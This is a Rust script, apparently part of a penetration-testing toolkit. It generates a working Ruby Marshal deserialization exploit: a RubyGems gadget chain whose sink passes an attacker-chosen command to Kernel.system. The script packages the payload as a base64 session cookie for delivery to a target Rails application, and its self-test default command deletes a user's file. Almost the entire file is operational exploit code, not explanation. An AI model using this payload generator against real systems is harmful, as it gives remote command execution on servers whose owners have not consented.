#!/usr/bin/env rust-script
//! name: ruby_ser
//! description: Ruby-deserialization payload driver (documented RubyGems gadget chain, Ruby 2.x/Rails Marshal sessions) - builds the Marshal graph Gem::Requirement -> Gem::Package::TarReader -> Net::BufferedIO -> Net::WriteAdapter -> Gem::RequestSet -> Net::WriteAdapter(Kernel, :system) whose sink runs the caller's command with Kernel.system, then emits it as base64 and optionally writes a http_session cookie jar whose session cookie is that payload - one envelope carries base64, byte length, jar path and selftest evidence; no Ruby runtime needed to generate.
//! version: 1.0.0
//! args: --cmd '<command>' [--header S] [--host HOST] [--cookie session] [--jar FILE] [--out FILE] [--selftest]
//! keywords: 漏洞猎手套件, 武器库, 渗透测试, ruby, deserialization, gadget, marshal, rails, session, cookie, rce, rubygems
//!
//! ```cargo
//! [dependencies]
//! ```
use pi_rust_lib::serde_json::{json, Map, Value};
use std::process::Command;

const B64: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

fn b64(data: &[u8]) -> String {
    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = *chunk.get(1).unwrap_or(&0) as u32;
        let b2 = *chunk.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(B64[(n >> 18) as usize & 63] as char);
        out.push(B64[(n >> 12) as usize & 63] as char);
        out.push(if chunk.len() > 1 { B64[(n >> 6) as usize & 63] as char } else { '=' });
        out.push(if chunk.len() > 2 { B64[n as usize & 63] as char } else { '=' });
    }
    out
}

/// Marshal's packed integer ("long") encoding, used for lengths and fixnum values.
fn long(n: i64) -> Vec<u8> {
    if n == 0 {
        return vec![0];
    }
    if n > 0 && n < 123 {
        return vec![(n + 5) as u8];
    }
    if n < 0 && n > -124 {
        return vec![(n - 5) as u8];
    }
    if n > 0 && n < 256 {
        return vec![1, n as u8];
    }
    if n < 0 && n > -256 {
        return vec![0xff, (n & 0xff) as u8];
    }
    if n > 0 && n < 65536 {
        return vec![2, ((n >> 8) & 0xff) as u8, (n & 0xff) as u8];
    }
    if n < 0 && n > -65536 {
        return vec![0xfe, ((n >> 8) & 0xff) as u8, (n & 0xff) as u8];
    }
    if n > 0 && n < 16777216 {
        return vec![3, ((n >> 16) & 0xff) as u8, ((n >> 8) & 0xff) as u8, (n & 0xff) as u8];
    }
    vec![
        4,
        ((n >> 24) & 0xff) as u8,
        ((n >> 16) & 0xff) as u8,
        ((n >> 8) & 0xff) as u8,
        (n & 0xff) as u8,
    ]
}

struct Enc {
    b: Vec<u8>,
}

impl Enc {
    fn new() -> Self {
        Enc { b: vec![4, 8] }
    }
    fn array(&mut self, n: usize) {
        self.b.push(b'[');
        self.b.extend(long(n as i64));
    }
    fn fixnum(&mut self, n: i64) {
        self.b.push(b'i');
        self.b.extend(long(n));
    }
    fn sym(&mut self, s: &str) {
        self.b.push(b':');
        self.b.extend(long(s.len() as i64));
        self.b.extend(s.as_bytes());
    }
    fn string(&mut self, s: &[u8]) {
        self.b.push(b'"');
        self.b.extend(long(s.len() as i64));
        self.b.extend_from_slice(s);
    }
    fn class(&mut self, s: &str) {
        self.b.push(b'c');
        self.b.extend(long(s.len() as i64));
        self.b.extend(s.as_bytes());
    }
    fn module(&mut self, s: &str) {
        self.b.push(b'm');
        self.b.extend(long(s.len() as i64));
        self.b.extend(s.as_bytes());
    }
    fn obj(&mut self, cls: &str, nvars: usize) {
        self.b.push(b'o');
        self.sym(cls);
        self.b.extend(long(nvars as i64));
    }
    fn userdef(&mut self, cls: &str) {
        self.b.push(b'U');
        self.sym(cls);
    }
}

/// Build the documented RubyGems Marshal gadget chain (Ruby 2.x / Rails Marshal sessions).
fn contains(hay: &[u8], needle: &str) -> bool {
    let n = needle.as_bytes();
    hay.len() >= n.len() && hay.windows(n.len()).any(|w| w == n)
}

fn build(cmd: &str, header: &str) -> Vec<u8> {
    let mut e = Enc::new();
    e.array(3);
    e.class("Gem::SpecFetcher");
    e.class("Gem::Installer");
    e.userdef("Gem::Requirement");
    e.array(1);
    e.obj("Gem::Package::TarReader", 1);
    e.sym("@io");
    e.obj("Net::BufferedIO", 2);
    e.sym("@io");
    e.obj("Gem::Package::TarReader::Entry", 2);
    e.sym("@read");
    e.fixnum(0);
    e.sym("@header");
    e.string(header.as_bytes());
    e.sym("@debug_output");
    e.obj("Net::WriteAdapter", 2);
    e.sym("@socket");
    e.obj("Gem::RequestSet", 2);
    e.sym("@sets");
    e.obj("Net::WriteAdapter", 2);
    e.sym("@socket");
    e.module("Kernel");
    e.sym("@method_id");
    e.sym("system");
    e.sym("@git_set");
    e.string(cmd.as_bytes());
    e.sym("@method_id");
    e.sym("resolve");
    e.b
}

const VERIFIER: &str = r#"
Gem::SpecFetcher; Gem::Installer; Gem::Package::TarReader; Gem::Package::TarReader::Entry
Gem::RequestSet; Net::BufferedIO; Net::WriteAdapter; Gem::Requirement
class Gem::Requirement
  def marshal_load(array); @requirements = array[0]; end
end
raw = File.binread(ARGV[0])
cmd = ARGV[1]
data = Marshal.load(raw)
raise "top-level is not a 3-element Array" unless data.is_a?(Array) && data.size == 3
raise "class slot 0" unless data[0] == Gem::SpecFetcher
raise "class slot 1" unless data[1] == Gem::Installer
r = data[2]
raise "slot 2 is not Gem::Requirement" unless r.is_a?(Gem::Requirement)
t = r.instance_variable_get('@requirements')
raise "not a TarReader" unless t.is_a?(Gem::Package::TarReader)
io = t.instance_variable_get('@io')
raise "TarReader @io" unless io.is_a?(Net::BufferedIO)
dbg = io.instance_variable_get('@debug_output')
raise "debug_output" unless dbg.is_a?(Net::WriteAdapter)
rs = dbg.instance_variable_get('@socket')
raise "resolve receiver" unless rs.is_a?(Gem::RequestSet)
wa1 = rs.instance_variable_get('@sets')
raise "sets" unless wa1.is_a?(Net::WriteAdapter)
raise "sink socket" unless wa1.instance_variable_get('@socket') == Kernel
raise "sink method" unless wa1.instance_variable_get('@method_id') == :system
raise "dbg method" unless dbg.instance_variable_get('@method_id') == :resolve
git = rs.instance_variable_get('@git_set')
raise "git_set=#{git.inspect}" unless git == cmd
entry = io.instance_variable_get('@io')
raise "entry" unless entry.is_a?(Gem::Package::TarReader::Entry)
puts "ROUNDTRIP_OK"
"#;

fn ruby_roundtrip(raw: &[u8], cmd: &str) -> String {
    let dir = std::env::temp_dir();
    let bin = dir.join("ruby_ser_selftest.bin");
    let rb = dir.join("ruby_ser_selftest.rb");
    if std::fs::write(&bin, raw).is_err() || std::fs::write(&rb, VERIFIER).is_err() {
        return "TMP_WRITE_FAILED".into();
    }
    match Command::new("ruby").arg(&rb).arg(&bin).arg(cmd).output() {
        Ok(o) => {
            let out = String::from_utf8_lossy(&o.stdout).trim().to_string();
            let err = String::from_utf8_lossy(&o.stderr).lines().last().unwrap_or("").trim().to_string();
            if o.status.success() {
                out
            } else {
                format!("RUBY_FAIL {err}")
            }
        }
        Err(e) => format!("RUBY_UNAVAILABLE {e}"),
    }
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut cmd = String::new();
    let mut header = "aaa".to_string();
    let mut host = String::new();
    let mut cookie = "session".to_string();
    let mut jar = String::new();
    let mut out = String::new();
    let mut selftest = false;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--cmd" => { i += 1; cmd = args.get(i).cloned().unwrap_or_default(); }
            "--header" => { i += 1; header = args.get(i).cloned().unwrap_or_default(); }
            "--host" => { i += 1; host = args.get(i).cloned().unwrap_or_default(); }
            "--cookie" => { i += 1; cookie = args.get(i).cloned().unwrap_or_default(); }
            "--jar" => { i += 1; jar = args.get(i).cloned().unwrap_or_default(); }
            "--out" => { i += 1; out = args.get(i).cloned().unwrap_or_default(); }
            "--selftest" => { selftest = true; }
            _ => {}
        }
        i += 1;
    }

    if selftest && cmd.is_empty() {
        cmd = "rm /home/carlos/morale.txt".to_string();
    }
    if cmd.is_empty() {
        pi_rust_lib::report::failure(
            "ruby_ser",
            "missing --cmd",
            "usage: ruby_ser --cmd '<command>' [--header aaa] [--host HOST] [--cookie session] [--jar FILE] [--out FILE] [--selftest]",
        );
        std::process::exit(2);
    }

    let raw = build(&cmd, &header);
    let payload = b64(&raw);

    let mut checks = Map::new();
    if selftest {
        checks.insert("marshal_header".into(), json!(raw.starts_with(&[4, 8])));
        checks.insert("cmd_present".into(), json!(String::from_utf8_lossy(&raw).contains(&cmd)));
        checks.insert("chain_classes".into(), json!(
            contains(&raw, "Gem::SpecFetcher")
                && contains(&raw, "Gem::Installer")
                && contains(&raw, "Gem::Requirement")
                && contains(&raw, "Gem::Package::TarReader")
                && contains(&raw, "Net::WriteAdapter")
                && contains(&raw, "Gem::RequestSet")
                && contains(&raw, "Kernel")
        ));
        let rt = ruby_roundtrip(&raw, &cmd);
        if !rt.starts_with("RUBY_UNAVAILABLE") {
            checks.insert("graph_roundtrip".into(), json!(rt == "ROUNDTRIP_OK"));
            checks.insert("graph_roundtrip_detail".into(), json!(rt));
        } else {
            checks.insert("graph_roundtrip".into(), json!("skipped"));
            checks.insert("graph_roundtrip_detail".into(), json!(rt));
        }
    }

    let jar_written = if !jar.is_empty() && !host.is_empty() {
        let body = json!({ &host: { &cookie: payload } });
        std::fs::write(&jar, format!("{body}\n")).is_ok()
    } else {
        false
    };
    let out_written = if !out.is_empty() {
        std::fs::write(&out, &raw).is_ok()
    } else {
        false
    };

    let data = json!({
        "plus_count": payload.matches('+').count(),
        "base64_url_encoded": payload.replace('+', "%2B"),
        "base64": payload,
        "bytes": raw.len(),
        "command": cmd,
        "header": header,
        "jar": if jar.is_empty() { Value::Null } else { json!(jar) },
        "jar_written": jar_written,
        "out": if out.is_empty() { Value::Null } else { json!(out) },
        "out_written": out_written,
        "selftest": Value::Object(checks),
    });
    pi_rust_lib::report::success(
        "ruby_ser",
        data,
        "deliver the cookie to the instance (http_dump/http_session with the jar, or --header 'Cookie: session=<base64>') - RubyGems 2.x Gem::Requirement#marshal_load reaches @requirements.each, driving the TarReader chain into Kernel.system",
    )
    .expect("report");
}
